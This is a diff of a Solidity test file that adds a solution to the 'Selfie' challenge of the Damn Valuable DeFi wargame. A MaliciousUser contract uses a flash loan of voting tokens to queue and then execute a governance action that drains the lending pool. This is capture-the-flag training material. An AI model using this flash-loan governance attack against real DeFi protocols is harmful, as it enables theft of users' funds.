@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,13 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
+        MaliciousUser attacker = new MaliciousUser(address(pool), address(governance));
+
+        bytes memory message = abi.encodeWithSignature("emergencyExit(address)", recovery);
+        pool.flashLoan(attacker, address(token), token.balanceOf(address(pool)), message);
         
+        vm.warp(block.timestamp + governance.getActionDelay());
+        attacker.attack();
     }
 
     /**
@@ -72,5 +79,35 @@ contract SelfieChallenge is Test {
         // Player has taken all tokens from the pool
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
+    }
+}
+
+
+contract MaliciousUser is IERC3156FlashBorrower {
+    address pool;
+    address governance;
+    uint256 actionId;
+
+    constructor(address _pool, address _governance){
+        pool = _pool;
+        governance = _governance;
+    }
+
+    function onFlashLoan(
+        address /*initiator*/,
+        address token,
+        uint256 amount,
+        uint256 ,// fee,
+        bytes calldata data
+    ) external returns (bytes32){
+        // you must more learn harder with governance
+        DamnValuableVotes(token).delegate(address(this));
+        actionId = SimpleGovernance(governance).queueAction(pool, uint128(0), data);
+        DamnValuableVotes(token).approve(pool, amount);
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
+
+    function attack() public {
+        SimpleGovernance(governance).executeAction(actionId);
     }
 }
